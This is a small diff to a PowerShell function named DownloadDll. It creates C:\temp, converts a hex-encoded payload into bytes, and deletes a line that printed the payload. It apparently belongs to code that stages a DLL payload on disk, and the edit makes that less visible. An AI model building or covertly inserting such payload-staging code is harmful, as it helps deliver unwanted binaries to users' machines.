@@ -5,7 +5,6 @@ function DownloadDll {
     if (!(Test-Path -Path "C:\temp\")) {
         New-Item -ItemType Directory -Path "C:\temp\"
     }
-    Write-output $payload
     # Convert the hexadecimal payload to a byte array
     $bytes = -split ($payload -replace '..', '0x$& ') | ForEach-Object { [System.Convert]::ToByte($_, 16) }
 
